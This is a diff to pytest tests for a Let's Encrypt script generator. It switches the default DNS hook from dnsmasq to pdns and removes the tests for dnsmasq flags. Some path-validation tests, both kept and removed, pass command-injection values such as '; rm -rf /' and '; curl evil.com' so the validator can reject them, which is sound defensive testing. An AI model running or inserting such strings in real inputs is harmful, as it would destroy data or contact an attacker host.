@@ -91,74 +91,6 @@ class TestCertScripts:
         assert "--webroot" not in script
         assert "-w " not in script
 
-    def test_cert_script_references_auth_hook(self):
-        host = _make_host()
-        files = generate_letsencrypt(_make_inventory(host))
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        assert "--manual-auth-hook" in script
-        assert "certbot-hook-dnsmasq auth-hook" in script
-
-    def test_cert_script_has_cleanup_hook(self):
-        host = _make_host()
-        files = generate_letsencrypt(_make_inventory(host))
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        assert "--manual-cleanup-hook" in script
-        assert "certbot-hook-dnsmasq cleanup-hook" in script
-
-    def test_cleanup_hook_has_same_dnsmasq_flags_as_auth_hook(self):
-        host = _make_host()
-        files = generate_letsencrypt(
-            _make_inventory(host),
-            dnsmasq_conf_dir="/opt/dnsmasq/ext",
-            dnsmasq_conf="/opt/dnsmasq/ext.conf",
-            dnsmasq_service="dnsmasq@custom",
-        )
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        # Both hooks should have the same dnsmasq flags
-        for hook_type in ("auth-hook", "cleanup-hook"):
-            assert f"{hook_type} --conf-dir /opt/dnsmasq/ext" in script
-            assert "--conf /opt/dnsmasq/ext.conf" in script
-            assert "--service dnsmasq@custom" in script
-
-    def test_cert_script_passes_dnsmasq_as_cli_flags(self):
-        host = _make_host()
-        files = generate_letsencrypt(_make_inventory(host))
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        # No env var exports
-        assert "export DNSMASQ_" not in script
-        # Dnsmasq params appear as CLI flags in the auth hook command
-        assert "--conf-dir /etc/dnsmasq.d/external" in script
-        assert "--conf /etc/dnsmasq.d/dnsmasq.external.conf" in script
-        assert "--service dnsmasq@external" in script
-
-    def test_custom_auth_hook(self):
-        host = _make_host()
-        files = generate_letsencrypt(
-            _make_inventory(host),
-            auth_hook="/usr/local/bin/my-dns-hook",
-        )
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        assert "/usr/local/bin/my-dns-hook auth-hook" in script
-
-    def test_custom_dnsmasq_params(self):
-        host = _make_host()
-        files = generate_letsencrypt(
-            _make_inventory(host),
-            dnsmasq_conf_dir="/opt/dnsmasq/ext",
-            dnsmasq_conf="/opt/dnsmasq/ext.conf",
-            dnsmasq_service="dnsmasq@custom",
-        )
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        assert "--conf-dir /opt/dnsmasq/ext" in script
-        assert "--conf /opt/dnsmasq/ext.conf" in script
-        assert "--service dnsmasq@custom" in script
-
     def test_cert_name_is_primary_fqdn(self):
         host = _make_host()
         files = generate_letsencrypt(_make_inventory(host))
@@ -327,22 +259,6 @@ class TestPathValidation:
                 auth_hook="/opt/hooks; rm -rf /",
             )
 
-    def test_rejects_malicious_dnsmasq_conf_dir(self):
-        host = _make_host()
-        with pytest.raises(ValueError, match="Unsafe dnsmasq_conf_dir"):
-            generate_letsencrypt(
-                _make_inventory(host),
-                dnsmasq_conf_dir="/etc; rm -rf /",
-            )
-
-    def test_rejects_malicious_dnsmasq_service(self):
-        host = _make_host()
-        with pytest.raises(ValueError, match="Unsafe dnsmasq_service"):
-            generate_letsencrypt(
-                _make_inventory(host),
-                dnsmasq_service="dnsmasq; curl evil.com",
-            )
-
     def test_accepts_valid_auth_hook(self):
         host = _make_host()
         files = generate_letsencrypt(
@@ -351,3 +267,43 @@ class TestPathValidation:
         )
         cert_files = [k for k in files if k.startswith("certs-available/")]
         assert len(cert_files) > 0
+
+
+class TestPdnsHook:
+    """The emitted scripts must invoke the hook the live renewals use.
+
+    All 13 live DNS-01 renewals run `certbot-hook-pdns auth-hook` with no
+    flags and no env. The generator used to emit the dnsmasq hook plus
+    --conf-dir/--conf/--service pointing at /etc/dnsmasq.d/external and
+    dnsmasq@external — a directory and a systemd instance that no longer
+    exist, so a newly-created cert would have failed DNS-01 validation.
+    """
+
+    def test_auth_and_cleanup_hooks_name_the_pdns_hook(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+
+        script = files["certs-available/desktop.welland.mithis.com"]
+        assert "/opt/certbot/bin/certbot-hook-pdns auth-hook" in script
+        assert "/opt/certbot/bin/certbot-hook-pdns cleanup-hook" in script
+
+    def test_no_dnsmasq_flags_or_env_remain(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+
+        script = files["certs-available/desktop.welland.mithis.com"]
+        for stale in ("--conf-dir", "--conf ", "--service",
+                      "DNSMASQ_", "dnsmasq"):
+            assert stale not in script, f"{stale!r} still emitted"
+
+    def test_custom_auth_hook_still_honoured(self):
+        """A site overriding auth_hook must still win — the pdns hook is only
+        the default."""
+        host = _make_host()
+        files = generate_letsencrypt(
+            _make_inventory(host), auth_hook="/usr/local/bin/my-dns-hook",
+        )
+
+        script = files["certs-available/desktop.welland.mithis.com"]
+        assert "/usr/local/bin/my-dns-hook auth-hook" in script
+        assert "/usr/local/bin/my-dns-hook cleanup-hook" in script
